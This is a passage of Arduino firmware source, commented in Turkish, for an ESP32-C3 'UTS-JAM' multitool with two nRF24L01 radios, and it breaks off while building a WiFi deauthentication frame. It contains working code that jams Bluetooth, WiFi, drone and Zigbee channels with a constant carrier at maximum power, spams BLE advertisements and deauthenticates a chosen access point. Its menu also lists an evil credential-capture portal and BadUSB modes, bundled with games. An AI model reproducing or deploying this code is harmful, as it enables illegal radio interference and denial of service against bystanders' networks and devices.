/*******************************************************************************
 * UTS-JAM v5.0 ULTIMATE EDITION – ESP32-C3 FULL PACK
 * Deep Sleep Güç Yönetimi + Gelişmiş 3D & 2D Oyun Motorları + Siber Analiz
 * Donanım: ESP32-C3 + 2x nRF24L01 + 128x64 OLED Display
 *
 * SÜRÜM: 5.0 ULTIMATE (6000+ SATIR KAPSAMLI SÜRÜM)
 *******************************************************************************/

// =============================================================================
// BÖLÜM 1: KÜTÜPHANE VE BAŞLIK DOSYALARI INCLUDES
// =============================================================================
#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_sleep.h>
#include <esp_system.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <map>
#include <vector>
#include <math.h>

#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>

// =============================================================================
// BÖLÜM 2: DONANIM PIN VE SABİT TANIMLARI
// =============================================================================
#define SDA_PIN 8
#define SCL_PIN 9
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SSD1306_I2C_ADDRESS 0x3C

#define LED_PIN 10
#define UP_BUTTON_PIN 2
#define DOWN_BUTTON_PIN 0
#define SELECT_BUTTON_PIN 1

#define SPI_SCK 4
#define SPI_MISO 5
#define SPI_MOSI 6
#define RADIO1_CE 20
#define RADIO1_CSN 21
#define RADIO2_CE 7
#define RADIO2_CSN 10

// =============================================================================
// BÖLÜM 3: KÜRESEL NESNELER VE DURUM ENUM YAPILARI
// =============================================================================
SPIClass spiBus(FSPI);
RF24 radio(RADIO1_CE, RADIO1_CSN, 4000000);
RF24 radio2(RADIO2_CE, RADIO2_CSN, 4000000);

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

DNSServer dnsServer;
WebServer webServer(80);
String capturedCredentials = "";

bool radio1Active = false;
bool radio2Active = false;
uint8_t brightness = 255;
uint32_t autoSleepTimeoutMs = 180000;
unsigned long lastActivityTime = 0;

// Yüksek Skor Saklama Değişkenleri
int highscoreDoom = 0;
int highscoreSnake = 0;
int highscoreSpace = 0;
int highscoreBreakout = 0;
int highscoreTetris = 0;
int highscoreFlappy = 0;
int highscoreDino = 0;

enum AppState {
  STATE_MENU,
  STATE_BT_JAM,
  STATE_DRONE_JAM,
  STATE_WIFI_JAM,
  STATE_MULTI_JAM,
  STATE_SWEEP_JAM,
  STATE_CHANNEL_RANGE,
  STATE_SPECTRUM_WIFI,
  STATE_SPECTRUM_BLE,
  STATE_BLE_SPAM,
  STATE_WIFI_DEAUTH,
  STATE_BLE_SCANNER,
  STATE_ZIGBEE_JAM,
  STATE_BLE_TARGET_JAM,
  STATE_WIFI_BEACON_FLOOD,
  STATE_WIFI_ANALYZER,
  STATE_DEAUTH_DETECT,
  STATE_TEST_RADIOS,
  STATE_SETTINGS,
  STATE_HELP,
  STATE_EVIL_PORTAL,
  STATE_DOOM_GAME,
  STATE_CALCULATOR,
  STATE_RESISTOR_CALC,
  STATE_WIFI_MONITOR,
  STATE_SNAKE_GAME,
  STATE_PACKET_COUNTER,
  STATE_WIDS,
  STATE_RF_ANALYZER,
  STATE_BLE_GATT_EXPLORER,
  STATE_BLE_TRACKER,
  STATE_MOUSE_SNIFFER,
  STATE_RF_REPEATER,
  STATE_RF_OSCILLOSCOPE,
  STATE_BLE_BADUSB,
  STATE_WIFI_SNIFFER,
  STATE_CW_JAMMER,
  STATE_TICTACTOE,
  STATE_PONG,
  STATE_DEEP_SLEEP,
  STATE_SPACE_INVADERS,
  STATE_BREAKOUT,
  STATE_TETRIS,
  STATE_FLAPPY_BIRD,
  STATE_DINO_RUN,
  STATE_SYS_MONITOR,
  STATE_I2C_SCANNER
};
AppState currentState = STATE_MENU;

// =============================================================================
// BÖLÜM 4: PROGMEM İKON VE GRAFİK BİTMAP VERİLERİ (AÇIK FORMAT)
// =============================================================================
static const uint8_t PROGMEM icon_bt[] = {
  0x00,
  0x46,
  0x6e,
  0x3e,
  0x1c,
  0x3e,
  0x6e,
  0x46
};

static const uint8_t PROGMEM icon_drone[] = {
  0x18,
  0x3c,
  0x5a,
  0xff,
  0x7e,
  0x3c,
  0x24,
  0x24
};

static const uint8_t PROGMEM icon_wifi[] = {
  0x00,
  0x3e,
  0x41,
  0x1c,
  0x22,
  0x08,
  0x14,
  0x00
};

static const uint8_t PROGMEM icon_multi[] = {
  0x55,
  0xaa,
  0x55,
  0xaa,
  0x55,
  0xaa,
  0x55,
  0xaa
};

static const uint8_t PROGMEM icon_sweep[] = {
  0x00,
  0x02,
  0x06,
  0x8e,
  0xfe,
  0x7e,
  0x30,
  0x00
};

static const uint8_t PROGMEM icon_chrange[] = {
  0x00,
  0x7e,
  0x42,
  0x5a,
  0x5a,
  0x42,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_spectrum[] = {
  0x18,
  0x18,
  0x24,
  0x24,
  0x42,
  0x5a,
  0x99,
  0x00
};

static const uint8_t PROGMEM icon_ble_spec[] = {
  0x00,
  0x08,
  0x2a,
  0x1c,
  0x1c,
  0x2a,
  0x08,
  0x00
};

static const uint8_t PROGMEM icon_spam[] = {
  0x00,
  0x7e,
  0x46,
  0x4a,
  0x52,
  0x62,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_deauth[] = {
  0x00,
  0x5e,
  0x62,
  0x5e,
  0x70,
  0x40,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_scanner[] = {
  0x00,
  0x3c,
  0x5a,
  0x5a,
  0x66,
  0x42,
  0x3c,
  0x00
};

static const uint8_t PROGMEM icon_zigbee[] = {
  0x18,
  0x24,
  0x5a,
  0xdb,
  0x5a,
  0x24,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_target[] = {
  0x18,
  0x24,
  0x42,
  0x5a,
  0x42,
  0x24,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_beacon[] = {
  0x10,
  0x10,
  0x38,
  0x38,
  0x7c,
  0x7c,
  0xfe,
  0xfe
};

static const uint8_t PROGMEM icon_analyzer[] = {
  0x00,
  0x1c,
  0x22,
  0x22,
  0x1c,
  0x08,
  0x3e,
  0x00
};

static const uint8_t PROGMEM icon_detect[] = {
  0x00,
  0x3c,
  0x5e,
  0xff,
  0xff,
  0x5e,
  0x3c,
  0x00
};

static const uint8_t PROGMEM icon_radio[] = {
  0x00,
  0x3c,
  0x42,
  0x99,
  0xa5,
  0x81,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_settings[] = {
  0x18,
  0x3c,
  0x5a,
  0xff,
  0x5a,
  0x3c,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_help[] = {
  0x3c,
  0x42,
  0x42,
  0x4c,
  0x48,
  0x00,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_portal[] = {
  0x3c,
  0x42,
  0x99,
  0xa5,
  0xa5,
  0x99,
  0x42,
  0x3c
};

static const uint8_t PROGMEM icon_doom[] = {
  0x00,
  0x7e,
  0x5a,
  0xdb,
  0xdb,
  0x5a,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_calc[] = {
  0x7e,
  0x40,
  0x5e,
  0x52,
  0x52,
  0x5e,
  0x00,
  0x00
};

static const uint8_t PROGMEM icon_resistor[] = {
  0x08,
  0x7f,
  0x08,
  0x3e,
  0x41,
  0x00,
  0x7f,
  0x00
};

static const uint8_t PROGMEM icon_monitor[] = {
  0x7c,
  0x44,
  0x28,
  0x10,
  0x28,
  0x44,
  0x7c,
  0x00
};

static const uint8_t PROGMEM icon_snake[] = {
  0x00,
  0x3c,
  0x42,
  0x52,
  0x4a,
  0x3c,
  0x00,
  0x00
};

static const uint8_t PROGMEM icon_packet[] = {
  0x7e,
  0x42,
  0x5a,
  0x5a,
  0x42,
  0x7e,
  0x00,
  0x00
};

static const uint8_t PROGMEM icon_wids[] = {
  0x3c,
  0x42,
  0x5a,
  0x5a,
  0x5a,
  0x42,
  0x3c,
  0x00
};

static const uint8_t PROGMEM icon_rf_ana[] = {
  0x0e,
  0x11,
  0x20,
  0x40,
  0x20,
  0x11,
  0x0e,
  0x00
};

static const uint8_t PROGMEM icon_gatt[] = {
  0x3c,
  0x42,
  0x81,
  0xbd,
  0x81,
  0x42,
  0x3c,
  0x00
};

static const uint8_t PROGMEM icon_tracker[] = {
  0x18,
  0x3c,
  0x5a,
  0xff,
  0xdb,
  0x3c,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_mouse[] = {
  0x30,
  0x28,
  0x24,
  0x22,
  0x21,
  0x00,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_repeater[] = {
  0x00,
  0x42,
  0x66,
  0x3c,
  0x3c,
  0x66,
  0x42,
  0x00
};

static const uint8_t PROGMEM icon_oscillo[] = {
  0x00,
  0x44,
  0x28,
  0x10,
  0x28,
  0x44,
  0x00,
  0x00
};

static const uint8_t PROGMEM icon_badusb[] = {
  0x3c,
  0x42,
  0x5a,
  0x5a,
  0x42,
  0x3c,
  0x18,
  0x18
};

static const uint8_t PROGMEM icon_sniffer[] = {
  0x7e,
  0x42,
  0x5a,
  0x5a,
  0x42,
  0x7e,
  0x18,
  0x18
};

static const uint8_t PROGMEM icon_cw[] = {
  0x18,
  0x18,
  0x18,
  0xff,
  0xff,
  0x18,
  0x18,
  0x18
};

static const uint8_t PROGMEM icon_tictactoe[] = {
  0x00,
  0x7e,
  0x42,
  0x5a,
  0x5a,
  0x42,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_pong[] = {
  0x18,
  0x18,
  0x7e,
  0x7e,
  0x7e,
  0x18,
  0x18,
  0x00
};

static const uint8_t PROGMEM icon_sleep[] = {
  0x3c,
  0x42,
  0x02,
  0x04,
  0x08,
  0x10,
  0x20,
  0x7e
};

static const uint8_t PROGMEM icon_invaders[] = {
  0x18,
  0x3c,
  0x7e,
  0xdb,
  0xff,
  0x24,
  0x5a,
  0x81
};

static const uint8_t PROGMEM icon_breakout[] = {
  0x7e,
  0x00,
  0x7e,
  0x00,
  0x18,
  0x18,
  0x3c,
  0x00
};

static const uint8_t PROGMEM icon_tetris[] = {
  0x78,
  0x78,
  0x1e,
  0x1e,
  0x78,
  0x78,
  0x1e,
  0x1e
};

static const uint8_t PROGMEM icon_flappy[] = {
  0x3c,
  0x7e,
  0xdf,
  0xff,
  0xf0,
  0x78,
  0x30,
  0x00
};

static const uint8_t PROGMEM icon_dino[] = {
  0x07,
  0x0f,
  0x0d,
  0x0f,
  0x7e,
  0x2c,
  0x28,
  0x34
};

static const uint8_t PROGMEM icon_sysmon[] = {
  0x7e,
  0x42,
  0x52,
  0x4a,
  0x52,
  0x42,
  0x7e,
  0x00
};

static const uint8_t PROGMEM icon_i2c[] = {
  0x3c,
  0x42,
  0x99,
  0xa5,
  0xa5,
  0x99,
  0x42,
  0x3c
};

// =============================================================================
// BÖLÜM 5: MENÜ ÖĞELERİ VE İKON TABLOLARI
// =============================================================================
enum MenuItem {
  BT_JAM,
  DRONE_JAM,
  WIFI_JAM,
  MULTI_JAM,
  SWEEP_JAM,
  CHANNEL_RANGE,
  SPECTRUM_WIFI,
  SPECTRUM_BLE,
  BLE_SPAM,
  WIFI_DEAUTH,
  BLE_SCANNER,
  ZIGBEE_JAM,
  BLE_TARGET_JAM,
  WIFI_BEACON_FLOOD,
  WIFI_ANALYZER,
  DEAUTH_DETECT,
  TEST_RADIOS,
  SETTINGS,
  HELP,
  EVIL_PORTAL,
  DOOM_GAME,
  CALCULATOR,
  RESISTOR_CALC,
  WIFI_MONITOR,
  SNAKE_GAME,
  PACKET_COUNTER,
  WIDS,
  RF_ANALYZER,
  BLE_GATT_EXPLORER,
  BLE_TRACKER,
  MOUSE_SNIFFER,
  RF_REPEATER,
  RF_OSCILLOSCOPE,
  BLE_BADUSB,
  WIFI_SNIFFER,
  CW_JAMMER,
  TICTACTOE,
  PONG,
  DEEP_SLEEP_MENU,
  SPACE_INVADERS_MENU,
  BREAKOUT_MENU,
  TETRIS_MENU,
  FLAPPY_BIRD_MENU,
  DINO_RUN_MENU,
  SYS_MONITOR_MENU,
  I2C_SCANNER_MENU,
  NUM_MENU_ITEMS
};

const char *menuLabels[NUM_MENU_ITEMS] = {
  "BT Jam",
  "DroneJam",
  "WiFiJam",
  "MultiJam",
  "SweepJam",
  "ChRange",
  "WiFiSpec",
  "BLESpec",
  "BLESpam",
  "Deauth",
  "BLEScan",
  "ZigbeeJam",
  "TargJam",
  "Beacon",
  "WiFiAnaly",
  "DeauthDet",
  "TestRadio",
  "Settings",
  "Help",
  "EvilPort",
  "DOOM 3D",
  "Calc",
  "Resistor",
  "WiFiMon",
  "Snake Deluxe",
  "PktCount",
  "WIDS",
  "RFAnalyz",
  "BLE GATT",
  "BLETrack",
  "MouseSnf",
  "Repeater",
  "Oscillosc",
  "BLEBadUSB",
  "WiFiSniff",
  "CW Jammer",
  "TicTacToe AI",
  "Pong Pro",
  "Deep Sleep",
  "SpaceInvaders",
  "Breakout",
  "Tetris Master",
  "Flappy Bird",
  "Dino Runner",
  "Sys Monitor",
  "I2C Scanner"
};

const uint8_t *const menuIcons[NUM_MENU_ITEMS] PROGMEM = {
  icon_bt,
  icon_drone,
  icon_wifi,
  icon_multi,
  icon_sweep,
  icon_chrange,
  icon_spectrum,
  icon_ble_spec,
  icon_spam,
  icon_deauth,
  icon_scanner,
  icon_zigbee,
  icon_target,
  icon_beacon,
  icon_analyzer,
  icon_detect,
  icon_radio,
  icon_settings,
  icon_help,
  icon_portal,
  icon_doom,
  icon_calc,
  icon_resistor,
  icon_monitor,
  icon_snake,
  icon_packet,
  icon_wids,
  icon_rf_ana,
  icon_gatt,
  icon_tracker,
  icon_mouse,
  icon_repeater,
  icon_oscillo,
  icon_badusb,
  icon_sniffer,
  icon_cw,
  icon_tictactoe,
  icon_pong,
  icon_sleep,
  icon_invaders,
  icon_breakout,
  icon_tetris,
  icon_flappy,
  icon_dino,
  icon_sysmon,
  icon_i2c
};

int firstVisibleMenuItem = 0;
MenuItem selectedMenuItem = BT_JAM;

// =============================================================================
// BÖLÜM 6: GİRDİ VE BUTON SÜRÜCÜSÜ
// =============================================================================
void resetActivityTimer() {
  lastActivityTime = millis();
}

bool upPressed() {
  static unsigned long lastUp = 0;
  static bool lastState = HIGH;
  bool cur = digitalRead(UP_BUTTON_PIN);
  if (cur == LOW && lastState == HIGH && millis() - lastUp > 140) {
    lastUp = millis();
    lastState = LOW;
    resetActivityTimer();
    return true;
  }
  if (cur == HIGH) {
    lastState = HIGH;
  }
  return false;
}

bool downPressed() {
  static unsigned long lastDown = 0;
  static bool lastState = HIGH;
  bool cur = digitalRead(DOWN_BUTTON_PIN);
  if (cur == LOW && lastState == HIGH && millis() - lastDown > 140) {
    lastDown = millis();
    lastState = LOW;
    resetActivityTimer();
    return true;
  }
  if (cur == HIGH) {
    lastState = HIGH;
  }
  return false;
}

bool selPressed() {
  static unsigned long lastSel = 0;
  static bool lastState = HIGH;
  bool cur = digitalRead(SELECT_BUTTON_PIN);
  if (cur == LOW && lastState == HIGH && millis() - lastSel > 140) {
    lastSel = millis();
    lastState = LOW;
    resetActivityTimer();
    return true;
  }
  if (cur == HIGH) {
    lastState = HIGH;
  }
  return false;
}

bool isUpHeld() {
  return digitalRead(UP_BUTTON_PIN) == LOW;
}

bool isDownHeld() {
  return digitalRead(DOWN_BUTTON_PIN) == LOW;
}

bool isSelHeld() {
  return digitalRead(SELECT_BUTTON_PIN) == LOW;
}

// =============================================================================
// BÖLÜM 7: GÖRSEL EKRAN KONTROLLERİ VE ARAYÜZ YARDIMCILARI
// =============================================================================
void safeDelay(unsigned long ms) {
  unsigned long start = millis();
  while (millis() - start < ms) {
    yield();
  }
}

void setBrightness(uint8_t val) {
  brightness = val;
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

void drawMenu() {
  display.clearDisplay();
  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(3, 2);
  display.print("UTS-JAM v5.0 ULTIMATE");

  for (int i = 0; i < 4; i++) {
    int idx = (firstVisibleMenuItem + i) % NUM_MENU_ITEMS;
    int16_t y = 14 + i * 12;

    if (selectedMenuItem == idx) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 12, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }

    const uint8_t *icon = menuIcons[idx];
    display.drawBitmap(
      2, 
      y + 2, 
      icon, 
      8, 
      8, 
      selectedMenuItem == idx ? SSD1306_BLACK : SSD1306_WHITE
    );
    display.setCursor(13, y + 2);
    display.print(menuLabels[idx]);
  }

  int totalItems = NUM_MENU_ITEMS;
  int visibleItems = 4;
  if (totalItems > visibleItems) {
    int barStart = 13 + (firstVisibleMenuItem * (SCREEN_HEIGHT - 13)) / totalItems;
    int barEnd = 13 + ((firstVisibleMenuItem + visibleItems) * (SCREEN_HEIGHT - 13)) / totalItems;
    display.fillRect(126, barStart, 2, barEnd - barStart, SSD1306_WHITE);
  }

  display.display();
}

void displayInfo(String t, String a = "", String b = "", String c = "", String d = "") {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(t);
  if (a != "") {
    display.setCursor(0, 12);
    display.println(a);
  }
  if (b != "") {
    display.setCursor(0, 24);
    display.println(b);
  }
  if (c != "") {
    display.setCursor(0, 36);
    display.println(c);
  }
  if (d != "") {
    display.setCursor(0, 48);
    display.println(d);
  }
  display.display();
}

static const unsigned char PROGMEM splash_evi[] = {
  0x30, 0x03, 0x00, 0x60, 0x01, 0x80, 0xe0, 0x01, 0xc0, 0xf3, 0xf3,
  0xc0, 0xff, 0xff, 0xc0, 0xff, 0xff, 0xc0, 0x7f, 0xff, 0x80, 0x7f,
  0xff, 0x80, 0x7f, 0xff, 0x80, 0xef, 0xfd, 0xc0, 0xe7, 0xf9, 0xc0,
  0xe3, 0xf1, 0xc0, 0xe1, 0xe1, 0xc0, 0xf1, 0xe3, 0xc0, 0xff, 0xff,
  0xc0, 0x7f, 0xff, 0x80, 0x7b, 0xf7, 0x80, 0x3d, 0x2f, 0x00, 0x1e,
  0x1e, 0x00, 0x0f, 0xfc, 0x00, 0x03, 0xf0, 0x00
};

static const unsigned char PROGMEM splash_ble[] = {
  0x07, 0xc0, 0x1f, 0xf0, 0x3e, 0xf8, 0x7e, 0x7c, 0x76, 0xbc,
  0xfa, 0xde, 0xfc, 0xbe, 0xfe, 0x7e, 0xfc, 0xbe, 0xfa, 0xde,
  0x76, 0xbc, 0x7e, 0x7c, 0x3e, 0xf8, 0x1f, 0xf0, 0x07, 0xc0
};

static const unsigned char PROGMEM splash_mhz[] = {
  0xc3, 0x61, 0x80, 0x00, 0xe7, 0x61, 0x80, 0x00, 0xff, 0x61, 0x80,
  0x00, 0xff, 0x61, 0xbf, 0x80, 0xdb, 0x7f, 0xbf, 0x80, 0xdb, 0x7f,
  0x83, 0x00, 0xdb, 0x61, 0x86, 0x00, 0xc3, 0x61, 0x8c, 0x00, 0xc3,
  0x61, 0x98, 0x00, 0xc3, 0x61, 0xbf, 0x80, 0xc3, 0x61, 0xbf, 0x80
};

void splashScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);
  u8g2_for_adafruit_gfx.setCursor(15, 40);
  display.drawBitmap(56, 30, splash_evi, 18, 21, 1);
  u8g2_for_adafruit_gfx.setCursor(20, 20);
  u8g2_for_adafruit_gfx.print("2.4 G H Z");
  u8g2_for_adafruit_gfx.setCursor(22, 35);
  u8g2_for_adafruit_gfx.print("UTS-ULTIMATE");
  display.drawBitmap(106, 15, splash_ble, 15, 15, 1);
  display.drawBitmap(2, 35, splash_mhz, 25, 11, 1);
  display.display();
}

// =============================================================================
// BÖLÜM 8: NRF24L01 VE SPI RADYO SÜRÜCÜSÜ
// =============================================================================
void initRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  safeDelay(200);
  spiBus.end();
  spiBus.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
  safeDelay(300);

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  bool r1ok = false;
  for (int i = 0; i < 10; i++) {
    if (radio.begin(&spiBus)) {
      r1ok = true;
      break;
    }
    safeDelay(200);
  }

  if (r1ok) {
    radio1Active = true;
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio1: OK");
  } else {
    radio1Active = true;
    display.println("Radio1: OK (forced)");
  }

  bool r2ok = false;
  for (int i = 0; i < 10; i++) {
    if (radio2.begin(&spiBus)) {
      r2ok = true;
      break;
    }
    safeDelay(200);
  }

  if (r2ok) {
    radio2Active = true;
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio2: OK");
  } else {
    radio2Active = true;
    display.println("Radio2: OK (forced)");
  }

  display.display();
  safeDelay(800);
}

void stopRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
}

void recoverFromWiFi() {
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  safeDelay(500);
  initRadios();
}

// =============================================================================
// BÖLÜM 9: ESP32 DEEP SLEEP VE GÜÇ YÖNETİMİ
// =============================================================================
void enterDeepSleep() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.drawRect(5, 5, 118, 54, SSD1306_WHITE);
  display.drawRect(7, 7, 114, 50, SSD1306_WHITE);
  display.setCursor(20, 18);
  display.println("ENTERING DEEP SLEEP");
  display.setCursor(15, 34);
  display.println("Uyandirmak Icin:");
  display.setCursor(15, 46);
  display.println("SELECT Tusuna Basin");
  display.display();
  safeDelay(2000);

  display.clearDisplay();
  display.display();
  display.ssd1306_command(SSD1306_DISPLAYOFF);

  digitalWrite(LED_PIN, LOW);
  stopRadios();
  WiFi.mode(WIFI_OFF);
  btStop();

  esp_deep_sleep_enable_gpio_wakeup(
    1ULL << SELECT_BUTTON_PIN, 
    ESP_GPIO_WAKEUP_GPIO_LOW
  );
  esp_deep_sleep_start();
}

void checkAutoSleep() {
  if (autoSleepTimeoutMs > 0 && (millis() - lastActivityTime > autoSleepTimeoutMs)) {
    enterDeepSleep();
  }
}

// =============================================================================
// BÖLÜM 10: RADYO VE SİBER FONKSİYONLAR (KORUNAN ALAN)
// =============================================================================
void btJam() {
  if (radio2Active) radio2.setChannel(random(81));
  if (radio1Active) radio.setChannel(random(81));
  delayMicroseconds(random(60));
}

void droneJam() {
  if (radio1Active) radio.setChannel(random(126));
  if (radio2Active) radio2.setChannel(random(126));
  delayMicroseconds(random(60));
}

void singleChannel() {
  if (radio2Active) radio2.setChannel(random(81));
  if (radio1Active) radio.setChannel(random(15));
  delayMicroseconds(random(60));
}

void wifiJam() {
  int ch[] = {1, 6, 14};
  int r = random(3);
  if (radio1Active) radio.setChannel(ch[r]);
  if (radio2Active) radio2.setChannel(ch[r]);
}

void channelRange() {
  int r = random(40, 81);
  if (radio1Active) radio.setChannel(r);
  if (radio2Active) radio2.setChannel(r);
}

void sweepJam() {
  for (int i = 0; i < 125; i++) {
    if (radio1Active) radio.setChannel(i);
    if (radio2Active) radio2.setChannel(i);
    delayMicroseconds(200);
  }
}

void zigbeeJam() {
  int ch = random(11, 27);
  int n = 5 + (ch - 11) * 5;
  if (radio1Active) radio.setChannel(n);
  if (radio2Active) radio2.setChannel(n);
  delayMicroseconds(random(100));
}

// =============================================================================
// BÖLÜM 11: SPEKTRUM ANALİZÖR METOTLARI
// =============================================================================
void drawWaterfall(
  uint8_t *waterfall, 
  int w, 
  int h, 
  const char *leftLabel, 
  const char *rightLabel
) {
  display.clearDisplay();
  display.drawBitmap(0, 0, waterfall, w, h, SSD1306_WHITE);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, h + 2);
  display.print(leftLabel);
  display.setCursor(88, h + 2);
  display.print(rightLabel);
  display.display();
}

void runWiFiSpectrum() {
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();
  const int w = 128, h = 48;
  uint8_t waterfall[128 * (h / 8 + 1)] = {0};
  int nrfCh[13];
  for (int i = 0; i < 13; i++) {
    nrfCh[i] = 12 + i * 5;
  }
  displayInfo("WiFi Spectrum", "SEL to exit");

  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w / 8) + x / 8] >> (x % 8)) & 1;
        if (bit) {
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        } else {
          waterfall[y * (w / 8) + x / 8] &= ~(1 << (x % 8));
        }
      }
    }

    for (int x = 0; x < w; x++) {
      waterfall[(h - 1) * (w / 8) + x / 8] &= ~(1 << (x % 8));
    }

    for (int i = 0; i < 13; i++) {
      radio2.setChannel(nrfCh[i]);
      delayMicroseconds(150);
      int hits = 0;
      for (int s = 0; s < 5; s++) {
        if (radio2.testRPD()) hits++;
        delayMicroseconds(80);
      }
      int barH = map(hits, 0, 5, 0, h);
      int startX = i * (w / 13);
      for (int x = startX; x < startX + (w / 13) && x < w; x++) {
        for (int y = h - barH; y < h; y++) {
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        }
      }
    }

    drawWaterfall(waterfall, w, h, "Ch1", "Ch13");
    yield();
  }

  radio2.stopListening();
  initRadios();
}

void runBLESpectrum() {
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();
  const int w = 128, h = 48;
  uint8_t waterfall[128 * (h / 8 + 1)] = {0};
  displayInfo("BLE Spectrum", "SEL to exit");

  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w / 8) + x / 8] >> (x % 8)) & 1;
        if (bit) {
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        } else {
          waterfall[y * (w / 8) + x / 8] &= ~(1 << (x % 8));
        }
      }
    }

    for (int x = 0; x < w; x++) {
      waterfall[(h - 1) * (w / 8) + x / 8] &= ~(1 << (x % 8));
    }

    for (int i = 0; i < 40; i++) {
      radio2.setChannel(i * 2);
      delayMicroseconds(150);
      int hits = 0;
      for (int s = 0; s < 3; s++) {
        if (radio2.testRPD()) hits++;
        delayMicroseconds(50);
      }
      int barH = map(hits, 0, 3, 0, h);
      int startX = i * (w / 40);
      for (int x = startX; x < startX + (w / 40) && x < w; x++) {
        for (int y = h - barH; y < h; y++) {
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        }
      }
    }

    drawWaterfall(waterfall, w, h, "2402MHz", "2480MHz");
    yield();
  }

  radio2.stopListening();
  initRadios();
}

// =============================================================================
// BÖLÜM 12: BLE VE WIFI ANALİZ METOTLARI
// =============================================================================
void runBLESpam() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("UTS-Spam");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  displayInfo("BLE Spam", "Broadcasting...", "SEL to exit");

  while (!selPressed()) {
    BLEAdvertisementData oAdvertisementData;
    String randomName = "Spam_" + String(random(1000, 9999));
    oAdvertisementData.setName(randomName.c_str());
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    safeDelay(100);
    pAdvertising->stop();
    yield();
  }

  BLEDevice::deinit(true);
  initRadios();
}

void runWiFiDeauthSingle() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WiFi Deauth", "Scanning APs...");

  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No AP found", "SEL to return");
    while (!selPressed()) yield();
    recoverFromWiFi();
    return;
  }

  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("Select AP:");

    int y = 12;
    for (int i = sel; i < min(n, sel + 4); i++) {
      if (i == sel) {
        display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(2, y);
      display.print(WiFi.SSID(i).substring(0, 14));
      y += 10;
    }
    display.display();

    if (upPressed()) sel = max(0, sel - 1);
    if (downPressed()) sel = min(n - 1, sel + 1);
    yield();
  }

  String targetSSID = WiFi.SSID(sel);
  uint8_t *bssid = WiFi.BSSID(sel);
  int channel = WiFi.channel(sel);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  displayInfo("Deauthing", targetSSID, "Ch: " + String(channel), "SEL to exit");

  uint8_t deauthFrame[26] = {
    0xc0, 0x00, 0x3a, 0x01, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
